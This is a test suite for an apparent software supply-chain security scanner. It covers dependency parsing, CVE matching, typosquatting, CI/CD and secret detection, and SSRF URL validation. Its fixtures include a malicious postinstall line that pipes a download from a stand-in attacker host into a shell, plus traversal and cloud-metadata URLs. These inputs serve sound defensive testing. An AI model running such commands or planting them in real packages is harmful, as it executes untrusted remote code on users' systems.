import { describe, it, expect } from "vitest";
import {
  parsePackageLockJson,
  parseYarnLock,
  parseRequirementsTxt,
  parseGemfileLock,
  parsePomXml,
  parseSbomJson,
  parseProjectFiles,
  normalizeVersion,
} from "@/lib/parsers";
import {
  isVersionVulnerable,
  scanVulnerabilities,
} from "@/lib/scanners/osv";
import {
  calculateLevenshteinDistance,
  detectSuspiciousPackages,
  hasUnicodeHomographs,
} from "@/lib/scanners/typosquatting";
import { analyzeDependencyConfusion } from "@/lib/scanners/dependency-confusion";
import { analyzeCiCdFiles } from "@/lib/scanners/cicd";
import {
  calculateShannonEntropy,
  maskSecretValue,
  scanForSecrets,
} from "@/lib/scanners/secrets";
import { analyzeLicenses, classifyLicenseSpdx } from "@/lib/scanners/licenses";
import {
  calculateProjectRiskScore,
  deduplicateVulnerabilities,
} from "@/lib/scanners/risk-score";
import {
  ScanRequestSchema,
  UploadedFileSchema,
  validateGitHubRepositoryUrl,
} from "@/lib/security/ssrf";
import {
  generateCycloneDxSbom,
  generateStructuredReportJson,
} from "@/lib/reports/exporter";
import {
  CLEAN_REFERENCE_FIXTURE,
  VULNERABLE_FINTECH_FIXTURE,
} from "@/lib/demo-fixtures";
import { runFullSecurityScan } from "@/lib/scanners/orchestrator";

describe("SupplyGuard Core Security Engines", () => {
  describe("1. Dependency Parsing & Ecosystem Support", () => {
    it("parses npm package-lock.json v3 and builds direct/transitive edges", () => {
      const lockContent = JSON.stringify({
        name: "sample-app",
        lockfileVersion: 3,
        packages: {
          "": {
            name: "sample-app",
            dependencies: { express: "4.18.2" },
          },
          "node_modules/express": {
            version: "4.18.2",
            license: "MIT",
            dependencies: { minimist: "1.2.5" },
          },
          "node_modules/minimist": {
            version: "1.2.5",
            license: "MIT",
          },
        },
      });

      const result = parsePackageLockJson(lockContent, "package-lock.json");
      expect(result.nodes).toHaveLength(2);
      const expressNode = result.nodes.find((n) => n.name === "express");
      const minimistNode = result.nodes.find((n) => n.name === "minimist");
      expect(expressNode?.scope).toBe("direct");
      expect(minimistNode?.scope).toBe("transitive");
      expect(result.edges.some((e) => e.source.includes("express") && e.target.includes("minimist"))).toBe(true);
    });

    it("parses yarn.lock, requirements.txt, Gemfile.lock, pom.xml, and CycloneDX SBOM", () => {
      const yarnRes = parseYarnLock(
        `lodash@^4.17.15:\n  version "4.17.15"\n  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.15.tgz"\n`,
        "yarn.lock"
      );
      expect(yarnRes.nodes[0]?.name).toBe("lodash");
      expect(yarnRes.nodes[0]?.version).toBe("4.17.15");

      const pyRes = parseRequirementsTxt("requests==2.28.1\n# comment\nurllib3>=1.26.15\n", "requirements.txt");
      expect(pyRes.nodes).toHaveLength(2);
      expect(pyRes.nodes[0]?.ecosystem).toBe("PyPI");

      const gemRes = parseGemfileLock(
        "GEM\n  specs:\n    nokogiri (1.15.4)\n\nDEPENDENCIES\n  nokogiri\n",
        "Gemfile.lock"
      );
      expect(gemRes.nodes[0]?.name).toBe("nokogiri");
      expect(gemRes.nodes[0]?.ecosystem).toBe("RubyGems");

      const pomRes = parsePomXml(
        `<project><properties><log4j.ver>2.14.1</log4j.ver></properties><dependencies><dependency><groupId>org.apache.logging.log4j</groupId><artifactId>log4j-core</artifactId><version>\${log4j.ver}</version></dependency></dependencies></project>`,
        "pom.xml"
      );
      expect(pomRes.nodes[0]?.name).toBe("org.apache.logging.log4j:log4j-core");
      expect(pomRes.nodes[0]?.version).toBe("2.14.1");

      const sbomRes = parseSbomJson(
        JSON.stringify({
          bomFormat: "CycloneDX",
          specVersion: "1.5",
          components: [
            {
              name: "axios",
              version: "1.5.0",
              purl: "pkg:npm/axios@1.5.0",
              licenses: [{ license: { id: "MIT" } }],
            },
          ],
        }),
        "bom.cdx.json"
      );
      expect(sbomRes.nodes[0]?.name).toBe("axios");
      expect(sbomRes.nodes[0]?.license).toBe("MIT");
    });

    it("flags unsupported file formats with a clear explanation", () => {
      const parsed = parseProjectFiles([
        { name: "archive.tar.gz", content: "binary-content" },
      ]);
      expect(parsed.unsupportedFiles).toHaveLength(1);
      expect(parsed.unsupportedFiles[0].reason).toContain("Unsupported file format");
    });
  });

  describe("2. Version Comparison & Vulnerability Matching", () => {
    it("accurately normalizes versions and evaluates semver vulnerability ranges", () => {
      expect(normalizeVersion("^4.17.15")).toBe("4.17.15");
      expect(isVersionVulnerable("4.17.15", "<4.17.21")).toBe(true);
      expect(isVersionVulnerable("4.17.21", "<4.17.21")).toBe(false);
      expect(isVersionVulnerable("2.14.1", ">=2.0.0 <2.17.1")).toBe(true);
      expect(isVersionVulnerable("2.17.1", ">=2.0.0 <2.17.1")).toBe(false);
    });

    it("detects known vulnerabilities on vulnerable packages and reports zero on patched versions", async () => {
      const parsedVuln = parseProjectFiles(VULNERABLE_FINTECH_FIXTURE.files);
      const vulnScan = await scanVulnerabilities(parsedVuln.dependencies, {
        skipNetwork: true,
      });
      expect(vulnScan.findings.length).toBeGreaterThanOrEqual(6);
      expect(vulnScan.findings.some((f) => f.cveId === "CVE-2021-23337")).toBe(true);
      expect(vulnScan.findings.some((f) => f.cveId === "CVE-2021-44906")).toBe(true);

      const parsedClean = parseProjectFiles(CLEAN_REFERENCE_FIXTURE.files);
      const cleanScan = await scanVulnerabilities(parsedClean.dependencies, {
        skipNetwork: true,
      });
      expect(cleanScan.findings).toHaveLength(0);
    });
  });

  describe("3. Malicious Package & Typosquatting Detection", () => {
    it("calculates Damerau-Levenshtein distance and detects homographs & suspicious postinstall hooks", () => {
      expect(calculateLevenshteinDistance("lodahs", "lodash")).toBe(1);
      expect(calculateLevenshteinDistance("reqeusts", "requests")).toBe(1);
      expect(hasUnicodeHomographs("l\u043Edash")).toBe(true); // Cyrillic 'о'

      const findings = detectSuspiciousPackages([
        {
          id: "npm:lodahs@4.17.21",
          name: "lodahs",
          version: "4.17.21",
          ecosystem: "npm",
          scope: "direct",
          depth: 1,
          hasInstallScripts: true,
          installScriptContent: "curl -s https://evil.example/payload.sh | sh",
          parents: ["root"],
          children: [],
          sourceFile: "package-lock.json",
        },
        {
          id: "npm:lodash@4.17.21",
          name: "lodash",
          version: "4.17.21",
          ecosystem: "npm",
          scope: "direct",
          depth: 1,
          parents: ["root"],
          children: [],
          sourceFile: "package-lock.json",
        },
      ]);

      expect(findings).toHaveLength(1);
      expect(findings[0].packageName).toBe("lodahs");
      expect(findings[0].similarLegitimatePackage).toBe("lodash");
      expect(findings[0].suspicionScore).toBeGreaterThanOrEqual(70);
      expect(findings[0].indicators.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe("4. Dependency Confusion Analysis", () => {
    it("identifies unscoped internal package names and extra-index-url misconfigurations", () => {
      const parsed = parseProjectFiles(VULNERABLE_FINTECH_FIXTURE.files);
      const findings = analyzeDependencyConfusion(
        parsed.dependencies,
        parsed.registryConfigs,
        VULNERABLE_FINTECH_FIXTURE.files
      );
      expect(findings.length).toBeGreaterThanOrEqual(2);
      expect(findings.some((f) => f.riskType === "INSECURE_REGISTRY_MIXING")).toBe(true);
      expect(findings.some((f) => f.packageName === "internal-ledger-sdk")).toBe(true);
    });
  });

  describe("5. CI/CD Workflow Static Analysis", () => {
    it("detects pull_request_target, write-all permissions, unpinned actions, and command injection", () => {
      const findings = analyzeCiCdFiles(VULNERABLE_FINTECH_FIXTURE.files);
      expect(findings.some((f) => f.ruleId === "GHA-001")).toBe(true); // Unpinned action
      expect(findings.some((f) => f.ruleId === "GHA-002")).toBe(true); // pull_request_target
      expect(findings.some((f) => f.ruleId === "GHA-003")).toBe(true); // write-all
      expect(findings.some((f) => f.ruleId === "GHA-004")).toBe(true); // Unsafe interpolation
      expect(findings.some((f) => f.ruleId === "GHA-005")).toBe(true); // curl | bash

      const cleanCicd = analyzeCiCdFiles(CLEAN_REFERENCE_FIXTURE.files);
      expect(cleanCicd).toHaveLength(0);
    });
  });

  describe("6. Secret Detection & Strict Redaction", () => {
    it("detects AWS, Stripe, and Postgres secrets and strictly masks raw values", () => {
      const rawAws = "AKIAIOSFODNN7TR9X8KL";
      const masked = maskSecretValue(rawAws);
      expect(masked).not.toBe(rawAws);
      expect(masked).toContain("****");
      expect(calculateShannonEntropy(rawAws)).toBeGreaterThan(3.0);

      const secretFindings = scanForSecrets(VULNERABLE_FINTECH_FIXTURE.files);
      expect(secretFindings.length).toBeGreaterThanOrEqual(3);
      for (const finding of secretFindings) {
        expect(finding.maskedValue).toContain("****");
        expect(finding.maskedValue).not.toContain("AKIAIOSFODNN7TR9X8KL");
        expect(finding.maskedValue).not.toContain("Pr0d_S3ttl3m3nt!99");
      }
    });
  });

  describe("7. License Compliance Classification", () => {
    it("classifies permissive, weak copyleft, and strong/network copyleft licenses", () => {
      expect(classifyLicenseSpdx("MIT").category).toBe("PERMISSIVE");
      expect(classifyLicenseSpdx("AGPL-3.0-only").category).toBe("NETWORK_COPYLEFT");
      expect(classifyLicenseSpdx("AGPL-3.0-only").isRestrictive).toBe(true);
      expect(classifyLicenseSpdx("LGPL-2.1").category).toBe("WEAK_COPYLEFT");

      const parsed = parseProjectFiles(VULNERABLE_FINTECH_FIXTURE.files);
      const licenses = analyzeLicenses(parsed.dependencies);
      expect(licenses.some((l) => l.spdxId === "AGPL-3.0" && l.isRestrictive)).toBe(true);
    });
  });

  describe("8. Risk Scoring & Deduplication", () => {
    it("deduplicates overlapping CVE/GHSA aliases and computes explainable 0-100 scores", async () => {
      const dupes = deduplicateVulnerabilities([
        {
          id: "GHSA-35jh-r3h4-6jhm",
          cveId: "CVE-2021-23337",
          ghsaId: "GHSA-35jh-r3h4-6jhm",
          aliases: ["CVE-2021-23337", "GHSA-35jh-r3h4-6jhm"],
          packageName: "lodash",
          installedVersion: "4.17.15",
          ecosystem: "npm",
          vulnerableRange: "<4.17.21",
          fixedVersion: "4.17.21",
          severity: "HIGH",
          cvssScore: 7.2,
          cvssVector: null,
          title: "Command Injection in lodash",
          description: "Desc",
          references: [],
          dependencyScope: "direct",
          dependencyPath: ["root", "lodash"],
          remediation: "Upgrade",
          exploitability: "HIGH_PROBABILITY",
          source: "OSV.dev",
        },
        {
          id: "CVE-2021-23337",
          cveId: "CVE-2021-23337",
          ghsaId: "GHSA-35jh-r3h4-6jhm",
          aliases: ["CVE-2021-23337"],
          packageName: "lodash",
          installedVersion: "4.17.15",
          ecosystem: "npm",
          vulnerableRange: "<4.17.21",
          fixedVersion: "4.17.21",
          severity: "HIGH",
          cvssScore: 7.2,
          cvssVector: null,
          title: "Duplicate entry for CVE-2021-23337",
          description: "Desc",
          references: [],
          dependencyScope: "direct",
          dependencyPath: ["root", "lodash"],
          remediation: "Upgrade",
          exploitability: "HIGH_PROBABILITY",
          source: "Verified Offline Intelligence",
        },
      ]);
      expect(dupes).toHaveLength(1);

      const cleanScan = await runFullSecurityScan({
        projectName: CLEAN_REFERENCE_FIXTURE.name,
        sourceType: "upload",
        files: CLEAN_REFERENCE_FIXTURE.files,
        skipNetwork: true,
      });
      expect(cleanScan.riskScore.overallScore).toBe(0);
      expect(cleanScan.riskScore.postureGrade).toBe("A");

      const vulnScan = await runFullSecurityScan({
        projectName: VULNERABLE_FINTECH_FIXTURE.name,
        sourceType: "upload",
        files: VULNERABLE_FINTECH_FIXTURE.files,
        skipNetwork: true,
      });
      expect(vulnScan.riskScore.overallScore).toBeGreaterThan(60);
      expect(vulnScan.riskScore.prioritizedRemediations.length).toBeGreaterThan(0);
    });
  });

  describe("9. SSRF Protection, URL Allowlisting & Input Validation", () => {
    it("blocks private IPs, localhost, non-HTTPS schemes, credentials, and non-GitHub hosts", () => {
      expect(validateGitHubRepositoryUrl("https://github.com/facebook/react").valid).toBe(true);
      expect(validateGitHubRepositoryUrl("http://github.com/facebook/react").valid).toBe(false);
      expect(validateGitHubRepositoryUrl("https://localhost/admin").valid).toBe(false);
      expect(validateGitHubRepositoryUrl("https://127.0.0.1/repo").valid).toBe(false);
      expect(validateGitHubRepositoryUrl("https://169.254.169.254/latest/meta-data/").valid).toBe(false);
      expect(validateGitHubRepositoryUrl("https://192.168.1.10/org/repo").valid).toBe(false);
      expect(validateGitHubRepositoryUrl("https://evil.example.com/facebook/react").valid).toBe(false);
      expect(validateGitHubRepositoryUrl("https://user:pass@github.com/facebook/react").valid).toBe(false);
      expect(validateGitHubRepositoryUrl("https://github.com:8080/facebook/react").valid).toBe(false);
      expect(validateGitHubRepositoryUrl("https://github.com/../../etc/passwd").valid).toBe(false);
    });

    it("enforces file upload path safety and request schema constraints", () => {
      expect(
        UploadedFileSchema.safeParse({ name: "../etc/passwd", content: "{}" }).success
      ).toBe(false);
      expect(
        ScanRequestSchema.safeParse({ mode: "github", repositoryUrl: "" }).success
      ).toBe(false);
      expect(
        ScanRequestSchema.safeParse({ mode: "upload", files: [] }).success
      ).toBe(false);
    });
  });

  describe("10. SBOM & Security Report Generation", () => {
    it("generates valid CycloneDX 1.5 SBOM and structured JSON security reports", async () => {
      const report = await runFullSecurityScan({
        projectName: VULNERABLE_FINTECH_FIXTURE.name,
        sourceType: "demo",
        files: VULNERABLE_FINTECH_FIXTURE.files,
        skipNetwork: true,
      });

      const sbom = generateCycloneDxSbom(report);
      expect(sbom.bomFormat).toBe("CycloneDX");
      expect(sbom.specVersion).toBe("1.5");
      expect(sbom.components.length).toBe(report.dependencies.length);
      expect(sbom.vulnerabilities.length).toBe(report.vulnerabilities.length);

      const jsonStr = generateStructuredReportJson(report);
      const parsedJson = JSON.parse(jsonStr);
      expect(parsedJson.reportHeader.projectName).toBe(VULNERABLE_FINTECH_FIXTURE.name);
      expect(parsedJson.limitationsAndDataSources.securityLimitations.length).toBeGreaterThan(0);
    });
  });
});
